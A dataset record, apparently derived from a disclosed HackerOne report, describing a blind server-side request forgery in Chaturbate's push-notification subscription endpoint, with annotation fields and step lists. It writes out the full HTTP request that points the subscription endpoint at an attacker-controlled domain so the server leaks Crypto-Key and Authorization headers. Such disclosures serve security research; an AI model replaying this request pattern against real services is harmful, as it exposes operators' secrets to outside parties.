@@ -1,0 +1,50 @@
+{
+    "reported_to": "Chaturbate",
+    "reported_by": "robin0oklay ",
+    "title": "Blind SSRF at https://chaturbate.com/notifications/update_push/",
+    "content": "\nIn the application at https://chaturbate.com/notifications/update_push/ there is a functionality to subscribe any cam model which will trigger the provided request. Using this Request an attacker can execute SSRF attack and also steal sensitive Token / Keys of the internal web server\nSteps to Replicate the submission:-\nLogin to your https://chaturbate.com/ account or use my account-\nUSERNAME-\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nPASSWORD-\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nNow click on profile, or trigger any request so that you can get your Cookie / CSRF token.\nSend any request to repeater and replace it with the provided request\nPOST /notifications/update_push/ HTTP/1.1\nHost: chaturbate.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0\nAccept: /\nAccept-Language: en-US,en;q=0.5\nReferer: https://chaturbate.com/princesscin/\nContent-Type: application/x-www-form-urlencoded\nX-CSRFToken: YOURCSRFHERE\nX-Requested-With: XMLHttpRequest\nContent-Length: 408\nCookie: YOURCOOKIEHERE\nConnection: close\nsubscription={\"endpoint\":\"http:\\/\\/\u2588\u2588\u2588\\/wpush\\/v2\\/\u2588\u2588\u2588\u2588&unsub=false\nAs you can see that I have changed the actual URL to my domain \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588, so that I can get the actual request send to the server.\nPut your cookie and CSRF token (you can copy CSRF token from your cookies) over here and than send this request\nGo to this URL to confirm SSRF at - http://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nyou will find that your Crypto-Key, Encryption header and Authorization Header is getting leaked onto the Attackers malicious site.\nThese headers are very sensitive to be leaked and hence needs to be fixed as soon as possible.\nNote\nThe application do not require to send the URL along with the domain, it is secure to only send the Rest part of the URL and do not include the domain so that the attacker could not control the complete request.\nThanks\nRegards\nRobin Ooklay\nImpact\nUsing this Request an attacker can execute SSRF attack and also steal sensitive Token / Keys of the internal web server.\n\n",
+    "severity": [
+        7.0,
+        8.9
+    ],
+    "bounty": null,
+    "weaknesses": [
+        "Server-Side Request Forgery (SSRF)"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1540113060,
+    "report_url": "https://hackerone.com/reports/411865",
+    "is_multi_component": false,
+    "complexity": "MEDIUM",
+    "novelty": "LOW",
+    "vuln_category": "WEB_APP",
+    "steps": [
+        [
+            1,
+            "Login to your Chaturbate account or use the provided test account."
+        ],
+        [
+            2,
+            "Navigate to the profile section or trigger any request to obtain your Cookie/CSRF token."
+        ],
+        [
+            3,
+            "Send a request to the repeater tool and replace it with the provided malicious request, modifying the endpoint to your controlled domain."
+        ],
+        [
+            4,
+            "Insert your Cookie and CSRF token into the request and send it."
+        ],
+        [
+            5,
+            "Check your controlled domain to confirm the SSRF and observe the leaked sensitive headers (Crypto-Key, Encryption header, Authorization Header)."
+        ]
+    ],
+    "vuln_description": "The vulnerability is a Blind Server-Side Request Forgery (SSRF) in the Chaturbate notifications update functionality. By manipulating the subscription endpoint in the request, an attacker can force the server to make requests to an external domain under their control, leading to the leakage of sensitive headers (Crypto-Key, Encryption header, Authorization Header).",
+    "reason": "The attack involves understanding the subscription mechanism and manipulating the endpoint parameter to an external domain. While the steps are straightforward, the discovery requires knowledge of SSRF and the ability to intercept and modify requests.",
+    "new_complexity": "MEDIUM",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null
+}
